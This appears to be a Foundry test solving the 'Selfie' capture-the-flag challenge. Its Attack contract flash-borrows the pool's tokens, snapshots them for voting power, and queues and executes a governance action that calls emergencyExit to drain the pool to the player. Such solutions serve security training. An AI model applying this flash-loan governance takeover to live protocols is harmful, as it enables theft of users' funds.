// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SelfiePool} from "../src/SelfiePool.sol";
import {SimpleGovernance} from "../src/SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../src/DamnValuableTokenSnapshot.sol";


contract POC is Test {
    SimpleGovernance governance;
    SelfiePool pool;
    DamnValuableTokenSnapshot snapshot;
    Attack attack;

    address player = makeAddr("player");
    uint256 TOKEN_INITIAL_SUPPLY = 2000000 ether;
    uint256 TOKEN_IN_POOl = 1500000 ether;

    function setUp() public {
        vm.startPrank(player);
        snapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);

        governance = new SimpleGovernance(address(snapshot));
        assertEq(governance.getActionCounter(), 1);

        pool = new SelfiePool(address(snapshot), address(governance));
        
        snapshot.transfer(address(pool), TOKEN_IN_POOl);
        snapshot.snapshot();
        assertEq(pool.maxFlashLoan(address(snapshot)), TOKEN_IN_POOl);

        attack = new Attack((pool), snapshot, governance, player);


        vm.deal(player, 1 ether);


        vm.stopPrank();
    }

    function test_canDrainPool() public {
        console.log(snapshot.balanceOf(player));
        vm.startPrank(player);
        attack.getLoan(TOKEN_IN_POOl);
        vm.warp(governance.getActionDelay() * 3);
        attack.execute();
        vm.stopPrank();
        console.log(snapshot.balanceOf(player));

    }
}

contract Attack is IERC3156FlashBorrower {
    SelfiePool private pool;
    DamnValuableTokenSnapshot token;
    SimpleGovernance governance;

    error UnsupportedCurrency();
    address player;

    constructor(SelfiePool _pool, DamnValuableTokenSnapshot _token,  SimpleGovernance _governance, address _player) {
        pool = _pool;
        token = _token;
        governance = _governance;
        player = _player;
    }

    function getLoan(uint256 _amount) public {
        pool.flashLoan(this, address(token), _amount, "");
    }
    function onFlashLoan(
        address,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        token.snapshot();
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
        uint256 _amount = token.balanceOf(address(this)) / 2;
        token.approve(address(this), _amount);
        governance.queueAction(address(pool), 0, data); 

        token.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function execute() public {
        governance.executeAction(1);
    }
     
    receive() external payable {}
}